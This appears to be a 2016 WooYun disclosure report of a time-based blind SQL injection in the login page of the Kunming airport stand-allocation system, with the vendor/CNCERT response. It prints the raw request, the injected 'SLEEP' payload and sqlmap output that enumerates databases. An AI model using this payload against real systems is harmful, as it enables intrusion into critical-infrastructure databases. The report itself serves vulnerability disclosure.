wybug_author: 天地不仁 以万物为刍狗
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2016-03-08：	细节已通知厂商并且等待厂商处理中									2016-03-11：	厂商已经确认，细节仅向厂商公开									2016-03-21：	细节向核心白帽子及相关领域专家公开									2016-03-31：	细节向普通白帽子公开									2016-04-10：	细节向实习白帽子公开									2016-04-25：	细节向公众公开  简要描述：  详细说明：  

昆明机场停机位保障系统
POST /home/public/login.html HTTP/1.1Host: **.**.**.**Content-Length: 41Accept: application/json, text/javascript, */*; q=0.01Origin: http://**.**.**.**X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 UBrowser/5.6.10551.6 Safari/537.36Content-Type: application/x-www-form-urlencoded; charset=UTF-8Referer: http://**.**.**.**/home/public/login.htmlAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Cookie: PHPSESSID=v9ub3q67g811lr185ltql597e3; goms_refferer_url=Home%2FFlightList%2Findex; goms_refferer_url_params=think%3A%5B%5D; Hm_lvt_e65701748f46df4625dd1cce6660bae6=1457371534; Hm_lpvt_e65701748f46df4625dd1cce6660bae6=1457371534Connection: closeusername=admin*&password=123456&remember=1




   漏洞证明：  
(custom) POST parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] nsqlmap identified the following injection point(s) with a total of 94 HTTP(s) requests:---Parameter: #1* ((custom) POST)    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: username=admin') AND (SELECT * FROM (SELECT(SLEEP(5)))eKoO) AND ('iTNn'='iTNn&password=123456&remember=1---[01:37:26] [INFO] the back-end DBMS is MySQLweb server operating system: Linux CentOS 6.5web application technology: Apache 2.2.15, PHP 5.5.26back-end DBMS: MySQL 5.0.12[01:37:26] [INFO] fetching database names[01:37:26] [INFO] fetching number of databases[01:37:26] [INFO] retrieved:[01:37:26] [WARNING] it is very important not to stress the network adapter during usage of time-based payloads to prevent potential errorsdo you want sqlmap to try to optimize value(s) for DBMS delay responses (option'--time-sec')? [Y/n] y4[01:37:34] [INFO] retrieved:[01:37:44] [INFO] adjusting time delay to 1 second due to good response timesinformation_schema[01:39:09] [INFO] retrieved: goms_[01:40:12] [ERROR] invalid character detected. retrying..[01:40:12] [WARNING] increasing time delay to 2 secondskmg[01:40:39] [INFO] retrieved: mysql[01:41:24] [INFO] retrieved: performance_s[01:43:57] [ERROR] invalid character detected. retrying..[01:43:57] [WARNING] increasing time delay to 3 secondschemaavailable databases [4]:[*] goms_kmg[*] information_schema[*] mysql[*] performance_schema[01:44:53] [INFO] fetched data logged to text files under 'C:\Users\Administrator\.sqlmap\output\**.**.**.**'[*] shutting down at 01:44:53
   修复方案：     版权声明：转载请注明来源 天地不仁 以万物为刍狗@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2016-03-11 15:55 厂商回复： CNVD确认所述情况，已经转由CNCERT下发给云南分中心，由其后续协调网站管理单位处置。 最新状态： 暂无
